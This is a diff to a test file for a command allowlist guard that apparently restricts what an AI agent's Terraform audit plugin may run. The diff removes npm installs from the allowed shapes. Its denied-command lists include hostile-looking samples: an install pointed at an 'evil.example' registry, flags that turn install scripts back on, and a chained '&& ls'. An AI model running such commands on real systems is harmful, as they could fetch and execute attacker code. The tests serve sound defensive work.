@@ -4,7 +4,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
-import { mkdtempSync, mkdirSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync, existsSync } from "node:fs";
+import { mkdtempSync, mkdirSync, readFileSync, realpathSync, rmSync, rmdirSync, symlinkSync, writeFileSync, existsSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import { pathToFileURL } from "node:url";
@@ -180,42 +180,21 @@ test("ls and test: only -d and -f/-d with plain paths", () => {
     denied(cmd);
 });
 
-test("the dependency install: only `npm ci --prefix <trusted skill folder> --omit=dev --ignore-scripts`, never in or from the audited repository", () => {
-  const ok = (prefix) => `npm ci --prefix ${prefix} --omit=dev --ignore-scripts`;
-  allowed(ok(SKILL_DIR));
-  allowed(ok(USER_SKILL));
-  allowed(ok("~/.gemini/skills/azure-terraform-stacks"));
-  for (const q of ['"', "'"]) denied(`npm ci --prefix ${q}${SKILL_DIR}${q} --omit=dev --ignore-scripts`, {}, /metacharacters/);
-  // the old form (npm in the working directory) is gone, even from a trusted folder
-  for (const cwd of [AUDITED, SKILL_DIR, undefined]) denied("npm ci --omit=dev --ignore-scripts", { cwd }, /only `npm ci --prefix/);
-  // a prefix inside the audited repository, a look-alike elsewhere, a trusted-looking name that is not an engine
+test("npm and npx are not on the allowlist: the engine needs no install, so nothing installs anything", () => {
+  const prefix = (p) => `npm ci --prefix ${p} --omit=dev --ignore-scripts`;
+  // the shape that used to be allowed, for every folder it used to accept, is now denied by the default rule
+  for (const cmd of [prefix(SKILL_DIR), prefix(USER_SKILL), prefix("~/.gemini/skills/azure-terraform-stacks")]) denied(cmd, {}, /`npm` is not on the allowlist/);
+  for (const q of ['"', "'"]) denied(prefix(`${q}${SKILL_DIR}${q}`), {}, /metacharacters/);
   const repo = tmp("ats-guard-npm-repo-");
-  const inRepo = stubSkill(join(repo, "azure-terraform-stacks"));
-  const elsewhere = stubSkill(join(tmp("ats-guard-npm-else-"), "azure-terraform-stacks"));
-  const notEngine = stubSkill(join(HOME, ".cursor", "skills", "azure-terraform-stacks"), "someone-elses-package");
-  denied(ok(inRepo), { cwd: repo }, /inside the working directory/);
-  denied(ok("azure-terraform-stacks"), { cwd: repo }, /inside the working directory/);
-  denied(ok("."), { cwd: repo }, /inside the working directory/);
-  denied(ok(inRepo), { cwd: AUDITED }, /not the engine of this plugin/);
-  denied(ok(elsewhere), {}, /not the engine of this plugin/);
-  denied(ok(repo), {}, /not the engine of this plugin/);
-  denied(ok(PLUGIN), {}, /not the engine of this plugin/);
-  denied(ok(join(HOME, ".gemini")), {}, /not the engine of this plugin/);
-  denied(ok(notEngine), {}, /not the engine's skill folder/);
-  denied(ok(`${sh(USER_SKILL)}/../azure-terraform-stacks`), {}, /"\.\." segment/);
-  denied(ok("~/.copilot/skills/azure-terraform-stacks"), {}, /does not exist or does not resolve/);
-  denied(ok(SKILL_DIR), { cwd: SKILL_DIR }, /inside the working directory/);
-  denied(ok(SKILL_DIR), { cwd: null }, /working directory is unknown/);
-  // every other flag or argument, and any other order
+  for (const cwd of [AUDITED, SKILL_DIR, repo, undefined]) {
+    for (const cmd of ["npm ci", "npm ci --omit=dev --ignore-scripts", "npm install", "npm i", "npm run test", "npm exec yaml", "npm", "npx yaml", "npx", "pnpm install", "yarn install"]) denied(cmd, { cwd }, /not on the allowlist/);
+  }
   for (const bad of [
     `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts=false`, `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --foreground-scripts`,
-    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --userconfig ${HOME}/x`, `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --globalconfig ${HOME}/x`,
-    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --registry http://evil.example`, `npm ci --registry http://evil.example --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`,
-    `npm ci --prefix ${SKILL_DIR} --omit=dev`, `npm ci --prefix ${SKILL_DIR} --ignore-scripts`, `npm ci --omit=dev --ignore-scripts --prefix ${SKILL_DIR}`,
-    `npm ci --prefix=${SKILL_DIR} --omit=dev --ignore-scripts`, `npm ci --prefix ${SKILL_DIR} --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`,
-    `npm ci --prefix --omit=dev --omit=dev --ignore-scripts`, `npm install --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`, `npm run test --prefix ${SKILL_DIR}`,
-    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts && ls`, "npx yaml", "npm ci", "npm install",
-  ]) denied(bad, {}, /only `npm ci --prefix|metacharacters|not on the allowlist/);
+    `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --userconfig ${HOME}/x`, `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts --registry http://evil.example`,
+    `npm ci --prefix=${SKILL_DIR} --omit=dev --ignore-scripts`, `npm install --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`, `npm run test --prefix ${SKILL_DIR}`,
+  ]) denied(bad, {}, /not on the allowlist/);
+  denied(`${prefix(SKILL_DIR)} && ls`, {}, /metacharacters/);
 });
 
 // Task 2.4: with a clean filter configured in the audited repository, `git -c core.fsmonitor=false status --porcelain`
@@ -259,8 +238,9 @@ test("every shape in SHAPES has a concrete command that the guard allows (so the
     "test -d <path>": "test -d /a",
     "node --version": "node --version",
     "node <engine> audit [--root <path>] [--json]": `node ${ENGINE} audit --root ${AUDITED} --json`,
-    "npm ci --prefix <skill folder> --omit=dev --ignore-scripts": `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`,
   };
+  assert.equal(SHAPES.length, 5);
+  assert.ok(!SHAPES.some((x) => /npm/.test(x)));
   assert.deepEqual(Object.keys(samples), SHAPES);
   for (const s of SHAPES) assert.equal(decide(samples[s], { cwd: AUDITED, home: HOME }).allow, true, s);
 });
@@ -336,10 +316,9 @@ test("the working directory must be an absolute path of an existing folder", () 
   denied(rel, { cwd: "relative/dir" }, /not an absolute path of an existing folder/);
   denied(rel, { cwd: "." }, /not an absolute path of an existing folder/);
   denied(rel, { cwd: join(tmpdir(), "ats-guard-no-such-cwd") }, /not an absolute path of an existing folder/);
-  denied(`npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`, { cwd: "relative/dir" }, /not an absolute path of an existing folder/);
 });
 
-test("--root with a .. segment is denied, like the engine and the --prefix", () => {
+test("--root with a .. segment is denied, like the engine", () => {
   denied(`node ${ENGINE} audit --root ${sh(AUDITED)}/../x`, {}, /"\.\." segment/);
   denied(`node ${ENGINE} audit --root ../x`, {}, /"\.\." segment/);
   allowed(`node ${ENGINE} audit --root ${AUDITED}`);
@@ -351,12 +330,10 @@ test("only the engine itself is trusted, not any file under a trusted folder: a 
   const nestedPlugin = stubSkill(join(SKILL_DIR, "node_modules", ".ats-test-nested", "azure-terraform-stacks"));
   try {
     denied(`node ${join(nestedPlugin, "scripts", "stacks.mjs")} audit`, {}, /is not the engine of this plugin/);
-    denied(`npm ci --prefix ${nestedPlugin} --omit=dev --ignore-scripts`, {}, /not the engine of this plugin/);
   } finally {
     rmSync(join(SKILL_DIR, "node_modules", ".ats-test-nested"), { recursive: true, force: true });
+    try { rmdirSync(join(SKILL_DIR, "node_modules")); } catch { /* not empty: an installed oracle, leave it */ }
   }
-  denied(`npm ci --prefix ${nestedEngine} --omit=dev --ignore-scripts`, {}, /not the engine of this plugin/);
-  denied(`npm ci --prefix ${join(USER_SKILL, "scripts")} --omit=dev --ignore-scripts`, {}, /not the engine of this plugin/);
   allowed(`node ${USER_ENGINE} audit`);
 });
 
@@ -372,7 +349,6 @@ const shellPaths = (argv) => {
   if (exe === "ls") return a.slice(1);
   if (exe === "test") return [a[1]];
   if (exe === "node") return [a[0], ...(a.includes("--root") ? [a[a.indexOf("--root") + 1]] : [])];
-  if (exe === "npm") return [a[2]];
   return [];
 };
 
@@ -459,7 +435,7 @@ test("regression (real value): the plugin's subagent is restricted, not ignored"
 });
 
 test("regression (real value): the audit and the other allowed shapes still run", () => {
-  for (const cmd of [`node ${ENGINE} audit --root ${AUDITED} --json`, `node ${ENGINE} audit`, "node --version", `ls -d ${ENGINE}`, `test -f ${ENGINE}`, `npm ci --prefix ${SKILL_DIR} --omit=dev --ignore-scripts`]) {
+  for (const cmd of [`node ${ENGINE} audit --root ${AUDITED} --json`, `node ${ENGINE} audit`, "node --version", `ls -d ${ENGINE}`, `test -f ${ENGINE}`]) {
     const r = fromFixture(cmd);
     assert.equal(r.code, 0, `${cmd}: ${r.stderr}`);
     assert.equal(r.stdout + r.stderr, "");
